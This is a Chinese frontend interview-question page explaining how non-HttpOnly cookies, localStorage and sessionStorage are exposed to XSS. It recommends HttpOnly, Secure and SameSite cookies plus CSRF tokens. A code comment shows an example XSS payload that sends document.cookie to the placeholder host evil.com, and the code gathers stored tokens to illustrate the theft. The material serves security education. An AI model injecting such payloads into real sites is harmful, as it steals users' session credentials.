---
title: [WEB-102] Cookie 和 Web Storage 在 XSS 面前的安全边界有何不同？
date: 2026-11-17
categories: [Web协议与浏览器]
tags: [前端面试, 面试题, 01]
type: 面试题
---

## WEB-102：Cookie 和 Web Storage 在 XSS 面前的安全边界有何不同？
**答**：
- XSS 立即可读：非 HttpOnly 的 cookie（`document.cookie`）、localStorage、sessionStorage 全部能被注入脚本读取并外传。
- HttpOnly cookie 是唯一对 JS 完全不可见的载体，配合 Secure/SameSite 是会话凭证的标准配置；代价是前端拿不到、CSRF 防护要另做（SameSite + token）。
- localStorage 存 token 的取舍：方便（请求头自带 Authorization）但 XSS 即失守，需以严格 CSP、依赖审计、短期化 + 刷新机制补偿。
- 结论：高敏感凭证放 HttpOnly cookie；Web Storage 只放可泄露不致命的数据，并把 XSS 面收窄。

```javascript
// XSS 攻击视角：注入 <script>fetch('//evil.com?t='+document.cookie)</script> 后
const leaked = {
  cookie: document.cookie,           // 非 HttpOnly 的全会被偷走
  token: localStorage.getItem('token'),   // Web Storage 全部可读
  session: sessionStorage.getItem('cart'),
};
console.log('XSS 可一次性外传：', leaked);

// 防御配置（服务端响应头）：
// Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Lax; Path=/
//   HttpOnly   -> document.cookie 读不到，XSS 偷不走
//   Secure     -> 只经 HTTPS 传输
//   SameSite   -> 抑制 CSRF 的跨站携带

// 前端输出侧的标配：任何插值先转义，缩小 XSS 面
const safe = (s) => s.replace(/[&<>"']/g, (c) =>
  ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
document.querySelector('#nick').textContent = userNick; // textContent 永不产生 HTML
```

## 追问（补充）

**追问**：

1. 凭证放进 HttpOnly cookie 后前端拿不到 token，请求怎么带？ → 靠浏览器自动携带，fetch 加 `credentials:'include'`，服务端按 Cookie 校验会话，不需要前端拼 Authorization 头。
2. 已有项目把 token 存在 localStorage，迁到 HttpOnly 的最小改动路径？ → 登录成功后由服务端 `Set-Cookie` 下发 session，前端删掉写入逻辑、全局请求改 `credentials:'include'`，同时补 CSRF token 与 SameSite。
3. `SameSite=Lax` 是不是就能替代 CSRF token？ → 不能，Lax 只拦跨站的非顶层请求，顶层 GET 导航仍会带 cookie，且老浏览器不识别；仍需双提交 token 或校验 Origin/Referer。
